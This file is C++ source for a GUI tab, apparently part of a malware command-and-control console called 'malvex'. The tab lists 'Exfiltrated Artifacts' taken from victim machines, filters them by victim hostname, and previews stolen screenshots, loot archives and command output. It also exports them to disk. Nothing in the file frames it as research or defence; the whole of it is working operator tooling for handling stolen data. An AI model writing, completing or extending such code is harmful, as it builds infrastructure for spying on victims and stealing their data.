#include "UiShared.hpp"
#include "Client.hpp"
#include "CommandManager.hpp"
#include "FileBrowser.hpp"
#include "LogManager.hpp"
#include "ResultManager.hpp"
#include "Types.hpp"

#include <algorithm>
#include <chrono>
#include <ctime>
#include <filesystem>
#include <format>

namespace {

std::string format_time(int64_t unix_time) {
    if (unix_time <= 0) {
        return "-";
    }
    const std::time_t t = static_cast<std::time_t>(unix_time);
    std::tm tm_buf{};
    localtime_r(&t, &tm_buf);
    return std::format(
        "{:04d}-{:02d}-{:02d} {:02d}:{:02d}",
        tm_buf.tm_year + 1900,
        tm_buf.tm_mon + 1,
        tm_buf.tm_mday,
        tm_buf.tm_hour,
        tm_buf.tm_min);
}

std::string victim_label(const UUID& victim_uid, const Client& client) {
    for (const auto& victim : client.getVictims()) {
        if (victim.uid == victim_uid) {
            return std::format("{} ({})", victim.hostname, victim.uid.substr(0, 8));
        }
    }
    return victim_uid.substr(0, 12);
}

} // namespace

void drawArtifactsTab(WindowState& state) {
    static Vector2 scroll = {0, 0};
    static Rectangle view = {0, 0, 0, 0};
    static int selected_row = -1;
    static std::string preview_text;
    static Texture2D preview_texture{};
    static bool texture_loaded = false;
    static FileBrowser save_browser{FileBrowser::Mode::SAVE_FILE};
    static std::string pending_export_uid;
    static std::string pending_export_name;
    static int victim_filter = 0;
    static LogManager& logMan = LogManager::instance();
    static ResultManager& resultMan = ResultManager::instance();
    static CommandManager& cmdMan = CommandManager::instance();

    const Color panel_fill{36, 36, 46, 255};
    const Color panel_border{90, 90, 110, 255};

    if (++state.artifacts_poll_counter >= 30) {
        state.artifacts_poll_counter = 0;
        static_cast<void>(state.client.pollResults());
    }

    const auto page = ui::content_area(state.res);
    draw_malvex_section_header(page, "Exfiltrated Artifacts");
    auto body = ui::section_content(page);

    if (GuiButton(ui::toolbar_button(body.x, body.y, 150), GuiIconText(ICON_REPEAT_FILL, "Refresh"))) {
        if (state.client.fetchResults()) {
            logMan.local_log("Fetched artifacts from server");
        } else {
            logMan.local_log("Fetching artifacts failed");
        }
    }

    const auto victims = state.client.getVictims();
    std::string victim_combo = "All victims";
    std::vector<std::string> victim_uid_storage;
    for (const auto& victim : victims) {
        victim_uid_storage.push_back(victim.uid);
        victim_combo += ";" + victim.hostname;
    }

    GuiLabel({body.x + 170, body.y, 80, ui::kControlHeight}, "Victim:");
    GuiComboBox(
        {body.x + 250, body.y, 220, ui::kControlHeight},
        victim_combo.c_str(),
        &victim_filter);

    Rectangle table_panel{
        body.x,
        body.y + ui::kControlHeight + ui::kGap,
        body.width,
        body.height * 0.55f,
    };
    ui::draw_panel_frame(table_panel, panel_fill, panel_border);
    const auto table_body = ui::panel_body(table_panel, false);

    auto results = resultMan.results();
    if (victim_filter > 0 && victim_filter <= static_cast<int>(victim_uid_storage.size())) {
        const auto& filter_uid = victim_uid_storage[static_cast<std::size_t>(victim_filter - 1)];
        std::erase_if(results, [&](const ResultDAO& r) { return r.victim_uid != filter_uid; });
    }

    const char* headers[] = {"Time", "Victim", "Kind", "Status", "Size", "Command UID"};
    constexpr int col_count = 6;
    const float col_width = table_body.width / col_count;
    constexpr float row_height = 24.0f;

    for (int i = 0; i < col_count; ++i) {
        Rectangle header_cell{
            table_body.x + i * col_width,
            table_body.y,
            col_width,
            row_height,
        };
        GuiLabel(header_cell, headers[i]);
    }

    const float content_height = row_height * static_cast<float>(results.size() + 2);
    GuiScrollPanel(
        {table_body.x, table_body.y + row_height, table_body.width, table_body.height - row_height},
        nullptr,
        {0, 0, table_body.width - 16.0f, content_height},
        &scroll,
        &view);

    BeginScissorMode(
        static_cast<int>(table_body.x),
        static_cast<int>(table_body.y + row_height),
        static_cast<int>(table_body.width),
        static_cast<int>(table_body.height - row_height));

    for (std::size_t row = 0; row < results.size(); ++row) {
        const auto& result = results[row];
        const float y = table_body.y + row_height + static_cast<float>(row) * row_height - scroll.y;

        Rectangle row_rect{table_body.x, y, table_body.width, row_height};
        if (state.highlight_command_uid && *state.highlight_command_uid == result.command_uid) {
            DrawRectangleRec(row_rect, {90, 40, 70, 120});
        }

        if (CheckCollisionPointRec(GetMousePosition(), row_rect) && IsMouseButtonPressed(MOUSE_BUTTON_LEFT)) {
            selected_row = static_cast<int>(row);
            state.highlight_command_uid = result.command_uid;

            if (texture_loaded) {
                UnloadTexture(preview_texture);
                texture_loaded = false;
            }

            const auto pending = cmdMan.get(result.command_uid);
            const std::string command_text = pending ? pending->command_text : "";
            const auto decoded = resultMan.decode(result.command_uid, command_text);

            if (decoded.kind == exfil::ExfilKind::Screenshot && !decoded.bytes.empty()) {
                Image image = LoadImageFromMemory(".ppm", decoded.bytes.data(), static_cast<int>(decoded.bytes.size()));
                if (image.data != nullptr) {
                    preview_texture = LoadTextureFromImage(image);
                    UnloadImage(image);
                    texture_loaded = true;
                    preview_text.clear();
                } else {
                    preview_text = "Failed to load screenshot preview";
                }
            } else if (!decoded.loot_files.empty()) {
                preview_text = std::format("Loot archive: {} files\n", decoded.loot_files.size());
                for (const auto& entry : decoded.loot_files) {
                    preview_text += std::format("- {} ({} bytes)\n", entry.path, entry.data.size());
                }
            } else {
                preview_text = decoded.text.empty() ? result.data.substr(0, 4096) : decoded.text;
            }
        }

        const std::string cells[] = {
            format_time(result.created_at),
            victim_label(result.victim_uid, state.client),
            result.kind,
            result.status == exfil::kStatusSuccess ? "OK" :
                (result.status == exfil::kStatusPending ? "Pending" : "Failed"),
            std::to_string(result.data.size()),
            result.command_uid.substr(0, 10) + "..."
        };

        for (int col = 0; col < col_count; ++col) {
            DrawTextEx(
                GetFontDefault(),
                cells[static_cast<std::size_t>(col)].c_str(),
                {table_body.x + col * col_width + 4.0f, y + 4.0f},
                14.0f,
                1.0f,
                {220, 200, 210, 255});
        }
    }

    EndScissorMode();

    Rectangle preview_panel{
        body.x,
        table_panel.y + table_panel.height + ui::kGap,
        body.width,
        std::max(120.0f, body.height - (table_panel.height + ui::kControlHeight + ui::kGap * 2)),
    };
    ui::draw_panel_frame(preview_panel, panel_fill, panel_border);
    const auto preview_body = ui::panel_body(preview_panel, false);

    if (selected_row >= 0 && selected_row < static_cast<int>(results.size())) {
        const auto& selected = results[static_cast<std::size_t>(selected_row)];
        if (GuiButton({preview_body.x, preview_body.y, 120, ui::kControlHeight}, "Save...")) {
            pending_export_uid = selected.command_uid;
            const auto pending = cmdMan.get(selected.command_uid);
            pending_export_name = pending ? pending->command_text : "artifact.txt";
            save_browser.set_title("Save Artifact");
            save_browser.set_suggested_filename(
                std::filesystem::path(pending_export_name).filename().string());
            save_browser.open();
        }

        const float preview_y = preview_body.y + ui::kControlHeight + ui::kGap;
        if (texture_loaded) {
            DrawTextureEx(preview_texture, {preview_body.x, preview_y}, 0.0f, 0.5f, WHITE);
        } else if (!preview_text.empty()) {
            GuiScrollPanel(
                {preview_body.x, preview_y, preview_body.width, preview_body.height - ui::kControlHeight - ui::kGap},
                nullptr,
                {0, 0, preview_body.width - 16.0f, 1200.0f},
                &scroll,
                &view);
            DrawTextEx(
                GetFontDefault(),
                preview_text.c_str(),
                {preview_body.x + 4.0f, preview_y + 4.0f},
                14.0f,
                1.0f,
                {240, 140, 180, 255});
        }
    } else {
        GuiLabel({preview_body.x, preview_body.y, preview_body.width, 20}, "Select a row to preview");
    }

    save_browser.render();
    if (!save_browser.is_open() && !save_browser.get_selected_path().empty() && !pending_export_uid.empty()) {
        if (resultMan.export_artifact(pending_export_uid, save_browser.get_selected_path())) {
            logMan.local_log(std::format("Exported artifact to {}", save_browser.get_selected_path()));
        } else {
            logMan.local_log("Exporting artifact failed");
        }
        save_browser.clear();
        pending_export_uid.clear();
    }
}
